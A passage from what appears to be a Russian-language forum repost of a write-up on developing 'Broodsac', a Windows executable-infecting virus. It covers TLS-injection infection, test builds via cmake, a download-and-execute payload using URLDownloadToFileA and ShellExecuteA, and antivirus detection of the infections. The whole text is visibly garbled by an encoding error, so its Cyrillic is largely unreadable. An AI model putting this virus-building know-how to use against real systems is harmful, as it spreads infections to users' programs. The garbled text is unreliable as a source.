—Ç–µ—Å—Ç–∏—Ä–æ–≤–∞—Ç—å, –∏—Å—Ö–æ–¥—è –∏–∑ –Ω–∞—à–µ–≥–æ –ø—Ä–æ–µ–∫—Ç–Ω–æ–≥–æ –∑–∞–º—ã—Å–ª–∞.<br />
<br />
–ü–æ—Å–∫–æ–ª—å–∫—É –º—ã —Ä–∞–±–æ—Ç–∞–µ–º —Å –∫–∞—Ç–∞–ª–æ–≥–æ–º TLS, –º—ã –≤ –æ—Å–Ω–æ–≤–Ω–æ–º –∏–º–µ–µ–º –¥–µ–ª–æ —Å <i>–≤–∏—Ä—Ç—É–∞–ª—å–Ω—ã–º–∏ –∞–¥—Ä–µ—Å–∞–º–∏</i>, –≤ –æ—Ç–ª–∏—á–∏–µ –æ—Ç RVA –∏ —Å–º–µ—â–µ–Ω–∏–π. –í–∏—Ä—Ç—É–∞–ª—å–Ω—ã–µ –∞–¥—Ä–µ—Å–∞ –æ–±—ã—á–Ω–æ –ø–æ–¥—Ä–∞–∑—É–º–µ–≤–∞—é—Ç –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ—Å—Ç—å –æ–±—Ä–∞–±–æ—Ç–∫–∏ –ø–µ—Ä–µ–∫–æ–º–ø–æ–Ω–æ–≤–æ–∫ –≤–Ω—É—Ç—Ä–∏ –±–∏–Ω–∞—Ä–Ω–æ–≥–æ —Ñ–∞–π–ª–∞. –≠—Ç–æ –∞–±—Å–æ–ª—é—Ç–Ω–æ —Ç–æ, —Å —á–µ–º –Ω–∞–º –Ω—É–∂–Ω–æ —Ä–∞–∑–æ–±—Ä–∞—Ç—å—Å—è –∫–∞–∫ –∑–∞—Ä–∞–∂–∞—é—â–µ–º—É –∏—Å–ø–æ–ª–Ω—è–µ–º–æ–º—É —Ñ–∞–π–ª—É ‚Äî —Å –ø–æ–≤—Å–µ–º–µ—Å—Ç–Ω—ã–º –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º Address Space Layout Randomization (aka /DYNAMICBASE), –±—ã–ª–æ –±—ã –≥–ª—É–ø–æ –Ω–µ —Ä–∞—Å—Å–º–∞—Ç—Ä–∏–≤–∞—Ç—å –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç—å –∏–∑–º–µ–Ω–µ–Ω–∏—è –∫–∞—Ç–∞–ª–æ–≥–∞ –ø–µ—Ä–µ–∫–æ–º–ø–æ–Ω–æ–≤–æ–∫ —Ü–µ–ª–µ–≤–æ–≥–æ –∏—Å–ø–æ–ª–Ω—è–µ–º–æ–≥–æ —Ñ–∞–π–ª–∞ –≤ —Å–ª—É—á–∞–µ –∑–∞—Ä–∞–∂–µ–Ω–∏—è.<br />
<br />
–¢–∞–∫–∏–º –æ–±—Ä–∞–∑–æ–º, —É –Ω–∞—Å –µ—Å—Ç—å —á–µ—Ç—ã—Ä–µ —Å–æ—Å—Ç–æ—è–Ω–∏—è –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–∏, —á—Ç–æ–±—ã –ø—Ä–æ—Ç–µ—Å—Ç–∏—Ä–æ–≤–∞—Ç—å –∑–∞—Ä–∞–∂–µ–Ω–∏–µ:<br />
<br />
<ul>
<li data-xf-list-type="ul">–Ω–µ—Ç –∫–∞—Ç–∞–ª–æ–≥–∞ tls, –Ω–µ—Ç –∫–∞—Ç–∞–ª–æ–≥–∞ –ø–µ—Ä–µ–∫–æ–º–ø–æ–Ω–æ–≤–æ–∫</li>
<li data-xf-list-type="ul">–Ω–µ—Ç –∫–∞—Ç–∞–ª–æ–≥–∞ tls, –∫–∞—Ç–∞–ª–æ–≥ –ø–µ—Ä–µ–∫–æ–º–ø–æ–Ω–æ–≤–æ–∫ –ø—Ä–∏—Å—É—Ç—Å—Ç–≤—É–µ—Ç</li>
<li data-xf-list-type="ul">–∫–∞—Ç–∞–ª–æ–≥ tls –ø—Ä–∏—Å—É—Ç—Å—Ç–≤—É–µ—Ç, –Ω–µ—Ç –∫–∞—Ç–∞–ª–æ–≥–∞ –ø–µ—Ä–µ–∫–æ–º–ø–æ–Ω–æ–≤–æ–∫</li>
<li data-xf-list-type="ul">–∫–∞—Ç–∞–ª–æ–≥ tls –ø—Ä–∏—Å—É—Ç—Å—Ç–≤—É–µ—Ç, –∫–∞—Ç–∞–ª–æ–≥ –ø–µ—Ä–µ–∫–æ–º–ø–æ–Ω–æ–≤–æ–∫ –ø—Ä–∏—Å—É—Ç—Å—Ç–≤—É–µ—Ç</li>
</ul><br />
–ö—Ä–æ–º–µ —Ç–æ–≥–æ, –Ω–∞–º –Ω—É–∂–Ω–æ —É—á–∏—Ç—ã–≤–∞—Ç—å —Ü–µ–ª–µ–≤—É—é 32-–±–∏—Ç–Ω—É—é –∞—Ä—Ö–∏—Ç–µ–∫—Ç—É—Ä—É, —Å–æ–∑–¥–∞–≤–∞—è –≤ –æ–±—â–µ–π —Å–ª–æ–∂–Ω–æ—Å—Ç–∏ 8 –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–π –±–∏–Ω–∞—Ä–Ω—ã—Ö —Ñ–∞–π–ª–æ–≤ –¥–ª—è —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è! –≠—Ç–æ —É–≤–µ–ª–∏—á–∏–≤–∞–µ—Ç –æ–±—â–µ–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –∫–æ–¥–æ–≤—ã—Ö –ø—Ä–æ–µ–∫—Ç–æ–≤ –≤ –Ω–∞—à–µ–º –≤–∏—Ä—É—Å–Ω–æ–º –ø—Ä–æ–µ–∫—Ç–µ –¥–æ 12. –° —Ö–æ—Ä–æ—à–µ–π —Å–∏—Å—Ç–µ–º–æ–π —Å–±–æ—Ä–∫–∏ –º—ã –º–æ–∂–µ–º –¥–æ–≤–æ–ª—å–Ω–æ –ª–µ–≥–∫–æ —Å–æ–±—Ä–∞—Ç—å –≤—Å–µ —ç—Ç–∏ —Ç–µ—Å—Ç–æ–≤—ã–µ –±–∏–Ω–∞—Ä–Ω—ã–µ —Ñ–∞–π–ª—ã:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		–ö–æ–¥:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>$ cd infectables
$ mkdir build32 build64
$ cd build32
$ cmake ../ -A Win32
$ cd ../build64
$ cmake ../ -A x64</code></pre>
	</div>
</div><br />
–°–∫—Ä–∏–ø—Ç—ã —Å–±–æ—Ä–∫–∏ –º–æ–≥—É—Ç –≤ –æ—Å–Ω–æ–≤–Ω–æ–º —Å–ª–µ–¥–æ–≤–∞—Ç—å –∏–µ—Ä–∞—Ä—Ö–∏–∏ –ø–∞–ø–æ–∫ –∏ —Å–æ–±–∏—Ä–∞—Ç—å –Ω–µ—Å–∫–æ–ª—å–∫–æ –ø—Ä–æ–µ–∫—Ç–æ–≤, —Å–æ–¥–µ—Ä–∂–∞—â–∏—Ö—Å—è –≤–Ω—É—Ç—Ä–∏, —á—Ç–æ –∑–¥–µ—Å—å –∏ –ø—Ä–æ–∏—Å—Ö–æ–¥–∏—Ç. –¢–µ–ø–µ—Ä—å —É –Ω–∞—Å –µ—Å—Ç—å –¥–≤–µ –Ω–∞—Å—Ç—Ä–æ–µ–Ω–Ω—ã–µ —Å—Ä–µ–¥—ã —Å–±–æ—Ä–∫–∏ ‚Äî –æ–¥–Ω–∞ –¥–ª—è 32-–±–∏—Ç–Ω–æ–π, –∏ –æ–¥–Ω–∞ –¥–ª—è 64-–±–∏—Ç–Ω–æ–π –∞—Ä—Ö–∏—Ç–µ–∫—Ç—É—Ä—ã.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		–ö–æ–¥:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>$ cd build32
$ cmake --build ./ --config Release
$ cd ../build64
$ cmake --build ./ --config Release</code></pre>
	</div>
</div><br />
–≠—Ç–æ –ø–æ–º–µ—Å—Ç–∏—Ç –≤—Å–µ –±–∏–Ω–∞—Ä–Ω—ã–µ —Ñ–∞–π–ª—ã –≤ –∫–∞—Ç–∞–ª–æ–≥ Release –≤–Ω—É—Ç—Ä–∏ —Å—Ä–µ–¥—ã —Å–±–æ—Ä–∫–∏. –û–Ω–∏ –∑–∞—Ç–µ–º –º–æ–≥—É—Ç –±—ã—Ç—å —Ü–µ–ª—å—é –¥–ª—è –∑–∞—Ä–∞–∂–µ–Ω–∏—è –Ω–∞—à–∏–º –∏—Å–ø–æ–ª–Ω—è–µ–º—ã–º —Ñ–∞–π–ª–æ–º –∑–∞—Ä–∞–∂–∞—Ç–µ–ª—è –≤ —Ü–µ–ª—è—Ö —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è. –ö–∞–∫ –∏ –∫–æ–º–ø–∏–ª—è—Ç–æ—Ä –Ω–∞ –∫–æ–º–∞–Ω–¥–Ω–æ–π —Å—Ç—Ä–æ–∫–µ, –º—ã –º–æ–∂–µ–º –Ω–∞—Å—Ç—Ä–æ–∏—Ç—å —Ä–∞–∑–ª–∏—á–Ω—ã–µ –ø–µ—Ä–µ–∫–ª—é—á–∞—Ç–µ–ª–∏ –¥–ª—è –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏—è –∑–∞–≥–æ–ª–æ–≤–∫–æ–≤ CMake. –ú—ã –º–æ–∂–µ–º –Ω–∞—Å—Ç—Ä–æ–∏—Ç—å –Ω–∞—à –∑–∞—Ä–∞–∂–∞—Ç–µ–ª—å, —á—Ç–æ–±—ã –æ–Ω –±—ã–ª –æ—Å–≤–µ–¥–æ–º–ª—ë–Ω –æ –∫–∞—Ç–∞–ª–æ–≥–µ, —Å–æ–¥–µ—Ä–∂–∞—â–µ–º –Ω–∞—à–∏ –∏—Å–ø–æ–ª–Ω—è–µ–º—ã–µ —Ñ–∞–π–ª—ã –¥–ª—è –∑–∞—Ä–∞–∂–µ–Ω–∏—è:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		–ö–æ–¥:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>$ mkdir build
$ cd build
$ cmake -DBROODSAC_DEBUG=ON -DBROODSAC_INFECTABLES=&quot;infectables&quot; \
  -A x64 ../</code></pre>
	</div>
</div><br />
–≠—Ç–∞ –∫–æ–º–∞–Ω–¥–∞ —ç—Ñ—Ñ–µ–∫—Ç–∏–≤–Ω–æ —Å–æ–±–∏—Ä–∞–µ—Ç Broodsac –≤ —Ä–µ–∂–∏–º–µ –æ—Ç–ª–∞–¥–∫–∏. –í–º–µ—Å—Ç–æ —Ç–æ–≥–æ —á—Ç–æ–±—ã –Ω–∞—Ü–µ–ª–∏–≤–∞—Ç—å—Å—è –Ω–∞ –¥–æ–º–∞—à–Ω–∏–π –∫–∞—Ç–∞–ª–æ–≥ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è, –æ–Ω –±—É–¥–µ—Ç –Ω–∞—Ü–µ–ª–µ–Ω –Ω–∞ –∫–∞—Ç–∞–ª–æ–≥ —Å –∑–∞—Ä–∞–∂–∞–µ–º—ã–º–∏ —Ñ–∞–π–ª–∞–º–∏, –≥–¥–µ –≤ –¥–∞–Ω–Ω—ã–π –º–æ–º–µ–Ω—Ç —Å–æ–±—Ä–∞–Ω—ã –Ω–∞—à–∏ —Ç–µ—Å—Ç–æ–≤—ã–µ –ø—Ä–æ–≥—Ä–∞–º–º—ã. –ó–∞–ø—É—Å—Ç–∏–≤ Broodsac –≤ —ç—Ç–æ–º —Å–æ—Å—Ç–æ—è–Ω–∏–∏, –º—ã —Å–º–æ–∂–µ–º –ª–µ–≥–∫–æ –ø—Ä–æ–≤–µ—Ä–∏—Ç—å —Å–æ—Å—Ç–æ—è–Ω–∏–µ –∑–∞—Ä–∞–∂–µ–Ω–∏—è –∏ —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤—É—é—â–µ–π –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏. –ò —ç—Ç–æ —á—Ä–µ–∑–≤—ã—á–∞–π–Ω–æ –≤–∞–∂–Ω–æ ‚Äî —Å–∞–º—ã–µ –æ–ø–∞—Å–Ω—ã–µ –¥–µ–º–æ–Ω—ã —Å–∫—Ä—ã–≤–∞—é—Ç—Å—è –≥–ª—É–±–∂–µ –≤—Å–µ–≥–æ. –ù–∞–¥–µ–∂–Ω–æ–µ —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –ø–æ–º–æ–∂–µ—Ç –∏—Ö –∏—Å–∫–æ—Ä–µ–Ω–∏—Ç—å.<br />
<br />
<b>--[ 5. –†–∞–±–æ—Ç–∞ —Å –ø—Ä–æ–±–ª–µ–º–∞–º–∏ —Ä–∞–∑—Ä–∞–±–æ—Ç–∫–∏</b><br />
<br />
–†–µ–∑—É–ª—å—Ç–∞—Ç –≤–∏—Ä—É—Å–∞, –∫–æ—Ç–æ—Ä—ã–π –≤—ã –≤–∏–¥–∏—Ç–µ –∑–¥–µ—Å—å, ‚Äî —ç—Ç–æ —Ç—Ä—É–¥ –ª—é–±–≤–∏, –º–Ω–æ–≥–∏–µ —á–∞—Å—ã, –ø—Ä–æ–≤–µ–¥–µ–Ω–Ω—ã–µ –∑–∞ –æ—Ç–ª–∞–¥–∫–æ–π, —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ–º, –ø—Ä–æ–≤–µ—Ä–∫–æ–π, –∏—Å–ø—Ä–∞–≤–ª–µ–Ω–∏–µ–º –∏ —Ä–µ—Ñ–∞–∫—Ç–æ—Ä–∏–Ω–≥–æ–º. –ù–æ –∫–æ–≥–¥–∞ –≤—ã –≤–∏–¥–∏—Ç–µ –∫–æ–Ω–µ—á–Ω—ã–π –ø—Ä–æ–¥—É–∫—Ç, –≤—ã –Ω–µ –≤–∏–¥–∏—Ç–µ —Ç–µ—Ö –º–µ–ª–∫–∏—Ö —à–∞–≥–æ–≤, –∫–æ—Ç–æ—Ä—ã–µ –≤ –∫–æ–Ω–µ—á–Ω–æ–º –∏—Ç–æ–≥–µ –ø—Ä–∏–≤–µ–ª–∏ –∫ —Å–æ–∑–¥–∞–Ω–∏—é —ç—Ç–æ–≥–æ –ø—Ä–æ–¥—É–∫—Ç–∞. –ü–æ—ç—Ç–æ–º—É —Ç—Ä—É–¥–Ω–æ –æ—Ü–µ–Ω–∏—Ç—å –±–æ—Ä—å–±—É, —Å –∫–æ—Ç–æ—Ä–æ–π —Å—Ç–∞–ª–∫–∏–≤–∞—é—Ç—Å—è —Ä–∞–∑—Ä–∞–±–æ—Ç—á–∏–∫–∏ –ø—Ä–æ–≥—Ä–∞–º–º–Ω–æ–≥–æ –æ–±–µ—Å–ø–µ—á–µ–Ω–∏—è. –≠—Ç–æ, –≤ –æ—Å–Ω–æ–≤–Ω–æ–º, –∏–Ω–¥–∏–≤–∏–¥—É–∞–ª—å–Ω–æ–µ –ø—É—Ç–µ—à–µ—Å—Ç–≤–∏–µ, –Ω–∞ –∫–æ—Ç–æ—Ä–æ–µ –æ—Ç–ø—Ä–∞–≤–ª—è–µ—Ç—Å—è –∫–∞–∂–¥—ã–π, –∫—Ç–æ –ø–∏—à–µ—Ç –∫–æ–¥.<br />
<br />
–û—á–µ–Ω—å –ª–µ–≥–∫–æ —Å–º–µ—è—Ç—å—Å—è –Ω–∞–¥ —Ö–æ—Ä–æ—à–µ–π, —É–∂–∞—Å–Ω–æ–π –æ—à–∏–±–∫–æ–π. –ù–∞—Å —É–¥–∏–≤–ª—è–µ—Ç, –∫–æ–≥–¥–∞ –≥–ª—É–ø—ã–µ –æ—à–∏–±–∫–∏, –∫–∞–∂–µ—Ç—Å—è, –∂–∏–≤—É—Ç –¥–æ–ª–≥–æ, –ø—Ä–æ—Å—Ç–æ –æ–∂–∏–¥–∞—è, –∫–æ–≥–¥–∞ –∏—Ö –æ–±–Ω–∞—Ä—É–∂–∏—Ç —Å–ª–µ–¥—É—é—â–∏–π —Å—á–∞—Å—Ç–ª–∏–≤—ã–π —É—á–∞—Å—Ç–Ω–∏–∫. –ù–æ –æ—à–∏–±–∫–∏ ‚Äî —ç—Ç–æ —á–∞—Å—Ç—å –∂–∏–∑–Ω–µ–Ω–Ω–æ–≥–æ —Ü–∏–∫–ª–∞ –ø—Ä–æ–≥—Ä–∞–º–º–Ω–æ–≥–æ –æ–±–µ—Å–ø–µ—á–µ–Ω–∏—è, –Ω–µ–∑–∞–≤–∏—Å–∏–º–æ –æ—Ç —Ç–æ–≥–æ, —ç–∫—Å–ø–ª—É–∞—Ç–∏—Ä—É–µ–º—ã –æ–Ω–∏ –∏–ª–∏ –Ω–µ—Ç.<br />
<br />
–≠—Ç–æ—Ç —Ä–∞–∑–¥–µ–ª —Å–æ—Å—Ä–µ–¥–æ—Ç–æ—á–µ–Ω –Ω–∞ –¥–≤—É—Ö –∫–ª—é—á–µ–≤—ã—Ö –º–æ–º–µ–Ω—Ç–∞—Ö –∫—Ä–∏—Ç–∏—á–µ—Å–∫–∏—Ö —Å–±–æ–µ–≤ –≤ –ø—Ä–æ—Ü–µ—Å—Å–µ —Ä–∞–∑—Ä–∞–±–æ—Ç–∫–∏ —ç—Ç–æ–≥–æ –≤–∏—Ä—É—Å–∞: –º–æ–º–µ–Ω—Ç–µ, –∫–æ–≥–¥–∞ –ø–µ—Ä–≤–æ–Ω–∞—á–∞–ª—å–Ω–∞—è –∏–¥–µ—è –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏ –ø—Ä–æ–≤–∞–ª–∏–ª–∞—Å—å –≤ –ø–æ—Å–ª–µ–¥–Ω–∏–π –º–æ–º–µ–Ω—Ç, –∏ –º–æ–º–µ–Ω—Ç–µ, –∫–æ–≥–¥–∞ –∞–Ω—Ç–∏–≤–∏—Ä—É—Å –Ω–∞—á–∞–ª –æ–±–Ω–∞—Ä—É–∂–∏–≤–∞—Ç—å –Ω–∞—à–∏ –∏–Ω—Ñ–µ–∫—Ü–∏–∏.<br />
<br />
<b>--[ 5.1 –ü–µ—Ä–≤–æ–Ω–∞—á–∞–ª—å–Ω—ã–π –¥–∏–∑–∞–π–Ω –ø—Ä–æ–≤–∞–ª–∏–≤–∞–µ—Ç—Å—è</b><br />
<br />
–í—ã –ø–æ–º–Ω–∏—Ç–µ, –∫–æ–≥–¥–∞ —è —Å–∫–∞–∑–∞–ª, —á—Ç–æ –∫–∞—Ç–∞–ª–æ–≥ TLS –≤–µ—Ä–Ω–µ—Ç—Å—è, —á—Ç–æ–±—ã —É–∫—É—Å–∏—Ç—å –Ω–∞—Å –∑–∞ –∑–∞–¥? –ö–∞–∫ –∂–µ –Ω–∞–º –ø–æ–º–æ–≥–ª–∞ –Ω–∞–¥—ë–∂–Ω–∞—è —Å–∏—Å—Ç–µ–º–∞ —Å–±–æ—Ä–∫–∏?<br />
<br />
–ò–∑–Ω–∞—á–∞–ª—å–Ω–æ –Ω–∞—à–∞ –ø–æ–ª–µ–∑–Ω–∞—è –Ω–∞–≥—Ä—É–∑–∫–∞ –±—ã–ª–∞ –æ—á–µ–Ω—å –ø—Ä–æ—Å—Ç–æ–π, –ª–æ–≥–∏—á–Ω–æ–π –ø—Ä–æ–≥—Ä–∞–º–º–æ–π: –∏–º–ø–æ—Ä—Ç–∏—Ä–æ–≤–∞—Ç—å GetFileAttributes, URLDownloadToFileA –∏ ShellExecuteA. –≠—Ç–æ –±—ã–ª–æ –±—ã –≤—Å—ë, —á—Ç–æ –Ω–∞–º –Ω—É–∂–Ω–æ, —á—Ç–æ–±—ã –∑–∞–≥—Ä—É–∑–∏—Ç—å –Ω–∞—à—É –æ–≤–µ—á–∫—É –∏ –∑–∞–ø—É—Å—Ç–∏—Ç—å –µ—ë –Ω–∞ —Ü–µ–ª–µ–≤–æ–π —Å–∏—Å—Ç–µ–º–µ. –ß—Ç–æ–±—ã –æ–±—ä—è—Å–Ω–∏—Ç—å —Ö–∞–æ—Å, –∫–æ—Ç–æ—Ä—ã–π –º—ã —Å–º—è–≥—á–∏–ª–∏, –¥–∞–≤–∞–π—Ç–µ —Ä–∞–∑–±–µ—Ä–µ–º —à–∞–≥–∏, –Ω–µ–æ–±—Ö–æ–¥–∏–º—ã–µ –¥–ª—è –≥–µ–Ω–µ—Ä–∞—Ü–∏–∏ –∏ —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è –Ω–∞—à–µ–π –æ–∫–æ–Ω—á–∞—Ç–µ–ª—å–Ω–æ–π –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏, –∑–∞—Ä–∞–∂–∞—Ç–µ–ª—è:<br />
<ol>
<li data-xf-list-type="ol">–°–∫–æ–º–ø–∏–ª–∏—Ä–æ–≤–∞—Ç—å C-–∏–Ω—Ñ–µ–∫—Ü–∏—é</li>
<li data-xf-list-type="ol">–ü—Ä–æ—Ç–µ—Å—Ç–∏—Ä–æ–≤–∞—Ç—å C-–∏–Ω—Ñ–µ–∫—Ü–∏—é</li>
<li data-xf-list-type="ol">–ü–µ—Ä–µ–≤–µ—Å—Ç–∏ –≤ assembly –Ω–∞ 32-–±–∏—Ç–Ω—ã—Ö –∏ 64-–±–∏—Ç–Ω—ã—Ö –∞—Ä—Ö–∏—Ç–µ–∫—Ç—É—Ä–∞—Ö</li>
<li data-xf-list-type="ol">–°–∫–æ–º–ø–∏–ª–∏—Ä–æ–≤–∞—Ç—å assembly (2x)</li>
<li data-xf-list-type="ol">–ü—Ä–æ—Ç–µ—Å—Ç–∏—Ä–æ–≤–∞—Ç—å assembly (2x)</li>
<li data-xf-list-type="ol">–í–∫–ª—é—á–∏—Ç—å shell-–∫–æ–¥ –≤ –Ω–∞—à –∑–∞—Ä–∞–∂–∞—Ç–µ–ª—å</li>
<li data-xf-list-type="ol">–°–∫–æ–º–ø–∏–ª–∏—Ä–æ–≤–∞—Ç—å –∑–∞—Ä–∞–∂–∞—Ç–µ–ª—å</li>
<li data-xf-list-type="ol">–ü—Ä–æ—Ç–µ—Å—Ç–∏—Ä–æ–≤–∞—Ç—å –∑–∞—Ä–∞–∂–∞—Ç–µ–ª—å</li>
<li data-xf-list-type="ol">–£–±–µ–¥–∏—Ç—å—Å—è, —á—Ç–æ –∏–Ω—Ñ–µ–∫—Ü–∏–∏ —É—Å–ø–µ—à–Ω—ã</li>
</ol>–ö–æ–≥–¥–∞ –º—ã –ø–æ–ª–Ω–æ—Å—Ç—å—é –ø–µ—Ä–µ—á–∏—Å–ª—è–µ–º —à–∞–≥–∏, –Ω–µ–æ–±—Ö–æ–¥–∏–º—ã–µ –¥–ª—è —Å–æ–∑–¥–∞–Ω–∏—è –∫–∞—á–µ—Å—Ç–≤–µ–Ω–Ω–æ–≥–æ –≤–∏—Ä—É—Å–∞, –º—ã –º–æ–∂–µ–º –æ—Ü–µ–Ω–∏—Ç—å, –∫–∞–∫ —Å–∏—Å—Ç–µ–º–∞ —Å–±–æ—Ä–∫–∏ —É–ø—Ä–æ—â–∞–µ—Ç —Å–ª–æ–∂–Ω—É—é —ç–∫–æ—Å–∏—Å—Ç–µ–º—É. –ü–æ—Ç–æ–º—É —á—Ç–æ –Ω–∞ –ª—é–±–æ–º —ç—Ç–∞–ø–µ —ç—Ç–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞ —á—Ç–æ-—Ç–æ –º–æ–∂–µ—Ç –ø–æ–π—Ç–∏ –Ω–µ —Ç–∞–∫. –í –ª—é–±–æ–π –º–æ–º–µ–Ω—Ç –ø—Ä–æ—Ü–µ—Å—Å–∞, –µ—Å–ª–∏ <i>—á—Ç–æ-—Ç–æ</i> –∏–¥–µ—Ç –Ω–µ —Ç–∞–∫, –Ω–∞–º –ø—Ä–∏–¥–µ—Ç—Å—è –Ω–∞—á–∞—Ç—å –∑–∞–Ω–æ–≤–æ —Å –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–Ω–æ–≥–æ —ç—Ç–∞–ø–∞. –ß–µ–º –±–æ–ª—å—à–µ –≤—Ä–µ–º–µ–Ω–∏ —Ç—Ä–µ–±—É–µ—Ç—Å—è –Ω–∞ –≤–æ–∑–æ–±–Ω–æ–≤–ª–µ–Ω–∏–µ —Ä–∞–±–æ—Ç—ã –ø–æ—Å–ª–µ —Å–±–æ—è, —Ç–µ–º –±–æ–ª—å—à–µ –≤—Ä–µ–º–µ–Ω–∏ —Ç–µ—Ä—è–µ—Ç—Å—è. –ò –µ—Å–ª–∏ —Å –æ—Ä–≥–∞–Ω–∏–∑–∞—Ü–∏–æ–Ω–Ω–æ–π —Ç–æ—á–∫–∏ –∑—Ä–µ–Ω–∏—è –Ω–µ—è—Å–Ω–æ, –∫—É–¥–∞ –Ω—É–∂–Ω–æ –∏–¥—Ç–∏, —á—Ç–æ–±—ã –ø–µ—Ä–µ–∑–∞–ø—É—Å—Ç–∏—Ç—å –ø—Ä–æ—Ü–µ—Å—Å, —ç—Ç–æ –Ω–∞–ø—Ä–∞—Å–Ω–∞—è —Ç—Ä–∞—Ç–∞ –≤—Ä–µ–º–µ–Ω–∏. –•–æ—Ä–æ—à–∞—è —Å–∏—Å—Ç–µ–º–∞ —Å–±–æ—Ä–∫–∏ —ç–∫–æ–Ω–æ–º–∏—Ç –≤—Ä–µ–º—è, —ç—Ç–æ—Ç –æ—á–µ–Ω—å —Ü–µ–Ω–Ω—ã–π —Ä–µ—Å—É—Ä—Å.<br />
<br />
–í –¥–∞–Ω–Ω–æ–º —Å–ª—É—á–∞–µ –±—ã–ª–æ –æ–±–Ω–∞—Ä—É–∂–µ–Ω–æ, —á—Ç–æ ShellExecuteA –∏ URLDownloadToFileA –Ω–µ —Å—Ä–∞–±–æ—Ç–∞–ª–∏ –Ω–∞ —ç—Ç–∞–ø–µ 9. –ó–∞–¥ —É–∫—É—à–µ–Ω. –ò –ø–æ—Å–º–æ—Ç—Ä–∏—Ç–µ, –∫–æ–≥–¥–∞ –æ–Ω –≤—ã–±—Ä–∞–ª –º–æ–º–µ–Ω—Ç, —á—Ç–æ–±—ã –Ω–∞—Å —É–∫—É—Å–∏—Ç—å ‚Äî –≤–æ –≤—Ä–µ–º—è —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è, –∞ –Ω–µ —Ä–∞–∑–≤–µ—Ä—Ç—ã–≤–∞–Ω–∏—è. –ü–æ—á–µ–º—É –Ω–∞—Å —É–∫—É—Å–∏–ª–æ? –ò–∑-–∑–∞ –Ω–∞—à–µ–π —Ç–µ—Ö–Ω–∏–∫–∏ –∏–Ω—Ñ–µ–∫—Ü–∏–∏ —á–µ—Ä–µ–∑ –≤–Ω–µ–¥—Ä–µ–Ω–∏–µ –≤ TLS.<br />
<br />
–ò–∑-–∑–∞ –≤—ã–±–æ—Ä–∞ –≤–Ω–µ–¥—Ä–µ–Ω–∏—è –≤ TLS –≤ –±–∏–Ω–∞—Ä–Ω–æ–º —Ñ–∞–π–ª–µ –º—ã –±—ã–ª–∏ —Å–æ–±–ª–∞–∑–Ω–µ–Ω—ã —Ç–µ–º, —á—Ç–æ –ø–æ–ª—É—á–∏–ª–∏ –ø—Ä–∏–æ—Ä–∏—Ç–µ—Ç –Ω–∞–¥ —Ç–æ—á–∫–æ–π –≤—Ö–æ–¥–∞ –∑–∞—Ä–∞–∂–µ–Ω–Ω–æ–≥–æ –∏—Å–ø–æ–ª–Ω—è–µ–º–æ–≥–æ —Ñ–∞–π–ª–∞. –ù–æ —ç—Ç–æ –æ–∑–Ω–∞—á–∞–µ—Ç, —á—Ç–æ –≤ –¥–∞–Ω–Ω—ã–π –º–æ–º–µ–Ω—Ç –º—ã –≤—ã–ø–æ–ª–Ω—è–µ–º—Å—è –≤ –∫–æ–Ω—Ç–µ–∫—Å—Ç–µ –∑–∞–≥—Ä—É–∑—á–∏–∫–∞ –∏—Å–ø–æ–ª–Ω—è–µ–º–æ–≥–æ —Ñ–∞–π–ª–∞. –≠—Ç–æ –æ–∑–Ω–∞—á–∞–µ—Ç, —á—Ç–æ –Ω–∞—à –∑–∞—Ä–∞–∂–µ–Ω–Ω—ã–π –∏—Å–ø–æ–ª–Ω—è–µ–º—ã–π —Ñ–∞–π–ª –µ—â—ë –Ω–µ –ø–æ–ª–Ω–æ—Å—Ç—å—é –∑–∞–≥—Ä—É–∂–µ–Ω. –í —á–∞—Å—Ç–Ω–æ—Å—Ç–∏, –≤ –Ω–∞—à–µ–º —Å–ª—É—á–∞–µ <i>–ø–æ—Ç–æ–∫–∏</i> –µ—â–µ –Ω–µ –ø–æ–ª–Ω–æ—Å—Ç—å—é –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä–æ–≤–∞–Ω—ã. –ë—ã–ª–æ 